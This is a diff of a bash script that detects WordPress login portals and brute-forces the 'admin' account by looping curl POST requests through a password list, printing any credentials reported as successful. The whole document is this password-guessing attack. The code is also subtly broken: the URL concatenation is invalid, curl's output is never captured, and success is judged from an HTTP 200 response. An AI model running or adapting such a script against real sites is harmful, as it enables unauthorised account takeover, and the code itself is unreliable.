@@ -51,37 +51,52 @@ echo ""
 echo -e "Looking for known login portals..."
 
 #//////////////////////////
+# WORDPRESS
+#//////////////////////////
 
 # URL of the login page
-LOGIN_URL=dnsname
+LOGIN_URL=dnsname+"/wp-login.php"
 
-# For each password...
-counter=0
-for pass in "${passwords[@]}"; do
+# Check if it exists
+response_code=$(curl -s -o /dev/null -w "%{http_code}" "$LOGIN_URL")
+if [ "$response_code" == "200" ]; then
 
-  counter=$((counter+1))
-  echo -e "Trying ${white}[${none}${yellow}${pass}${none}${white}]${none} (${lightpurple}${counter}${none}/${purple}${passwords_length}${none}) against [${lightpurple}${usernames_length}${none}] usernames..."
-  echo -e -n " ${orange}[${none}"
-
-  # For each username...
-  for user in "${usernames[@]}"; do
-  
-	echo -e -n "${yellow}=${none}"
+    echo "[WordPress] login portal found."
 	
-	# Try to login
-	LOGIN_RESPONSE=curl -d "username=$user&password=$pass" -X POST $LOGIN_URL
+	# Common default WordPress logins
+	usernames=("admin")
+	usernames_length=${#usernames[@]}
 	
-	# Check if the response code indicates success (200)
-	if [[ $LOGIN_RESPONSE == *"200" ]]; then
-		echo ""
-		echo -e "[${green}Success${none}] Username: [${user}], Password: [${pass}]"
-	else
-		# echo "[Failed] Login failed. HTTP response code: $LOGIN_RESPONSE"
-		:
-	fi
+	# For each password...
+	counter=0
+	for pass in "${passwords[@]}"; do
 
-  done
-done
+	  counter=$((counter+1))
+	  echo -e "Trying ${white}[${none}${yellow}${pass}${none}${white}]${none} (${lightpurple}${counter}${none}/${purple}${passwords_length}${none}) against [${lightpurple}${usernames_length}${none}] usernames..."
+	  echo -e -n " ${orange}[${none}"
+
+	  # For each username...
+	  for user in "${usernames[@]}"; do
+	  
+		echo -e -n "${yellow}=${none}"
+		
+		# Try to login
+		LOGIN_RESPONSE=curl -d "username=$user&password=$pass" -X POST $LOGIN_URL
+		
+		# Check if the response code indicates success (200)
+		if [[ $LOGIN_RESPONSE == *"200" ]]; then
+			echo ""
+			echo -e "[${green}Success${none}] Username: [${user}], Password: [${pass}]"
+		else
+			# echo "[Failed] Login failed. HTTP response code: $LOGIN_RESPONSE"
+			:
+		fi
+
+	  done
+	done
+else
+    :
+fi
 
 #//////////////////////////
 
